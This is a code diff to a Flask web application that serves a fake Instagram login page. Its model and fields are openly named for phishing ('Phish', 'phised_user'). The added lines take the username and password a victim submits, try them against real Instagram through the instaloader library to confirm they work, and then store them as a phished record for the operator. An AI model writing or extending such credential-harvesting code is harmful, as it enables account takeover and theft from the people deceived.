@@ -2,7 +2,7 @@ from app import db, app
 from flask import render_template, request, session, redirect
 from flask_jwt_extended import jwt_required, get_current_user
 from app.main.config.models import Phish
-
+import instaloader
 @app.route('/instagram/login', methods=['GET', 'POST'])
 def ig_login():
     current_user = get_current_user()
@@ -10,6 +10,13 @@ def ig_login():
         return render_template('ig_login.html')
     elif request.method == 'POST':
         data = request.form.to_dict()
+        loader = instaloader.Instaloader()
+        try:
+            loader.login(data["username"], data["password"])
+        except Exception as e:
+            print('###############################' + str(e))
+            return str(e)
+        
         user_phished = Phish(platform='Instagram',
                              owner=session["curr"],
                              phised_user=data["username"],
